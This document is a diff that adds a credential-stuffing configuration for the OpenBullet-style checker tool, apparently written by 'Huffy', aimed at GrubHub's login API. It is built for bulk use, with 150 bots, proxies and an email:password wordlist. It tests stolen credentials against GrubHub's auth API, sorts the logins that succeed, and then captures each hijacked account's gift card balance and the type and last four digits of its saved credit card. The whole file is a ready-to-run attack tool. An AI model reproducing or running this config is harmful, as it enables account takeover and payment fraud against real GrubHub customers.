@@ -1,0 +1,84 @@
+[SETTINGS]
+{
+  "Name": "GrubHub_Huffy",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-07T04:05:26.6980119+08:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Huffy",
+  "Version": "1.2.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api-gtm.grubhub.com/auth" 
+  CONTENT "{\"brand\":\"GRUBHUB\",\"client_id\":\"beta_UmWlpstzQSFmocLy3h1UieYcVST\",\"device_id\":1469286275,\"scope\":\"anonymous\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://www.grubhub.com/login" 
+  HEADER "Authorization: Bearer" 
+
+PARSE "<SOURCE>" LR "access_token\":\"" "\"," -> VAR "token" 
+
+REQUEST POST "https://api-gtm.grubhub.com/auth" 
+  CONTENT "{\"brand\":\"GRUBHUB\",\"client_id\":\"beta_UmWlpstzQSFmocLy3h1UieYcVST\",\"device_id\":1469286275,\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <token>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+  KEYCHAIN Success OR 
+    KEY "ud_id" 
+
+PARSE "<SOURCE>" LR "ud_id\":\"" "\",\"" -> VAR "id" 
+
+PARSE "<SOURCE>" LR "access_token\":\"" "\",\"" -> VAR "token2" 
+
+REQUEST GET "https://api-gtm.grubhub.com/codes/vault/<id>/giftcards" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <token2>" 
+
+PARSE "<SOURCE>" LR "total_amount_remaining\":" "}" -> CAP "Total Gift Card Balance" "$" "" 
+
+REQUEST GET "https://api-gtm.grubhub.com/payments/<id>/credit_card" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Referer: https://www.grubhub.com/account/payment" 
+  HEADER "Authorization: Bearer <token2>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "[]" 
+
+PARSE "<SOURCE>" LR "credit_card_type\":\"" "\",\"" -> CAP "Payment Type" 
+
+PARSE "<SOURCE>" LR "last4\":\"" "\",\"" -> CAP "Last 4 digits" 
+
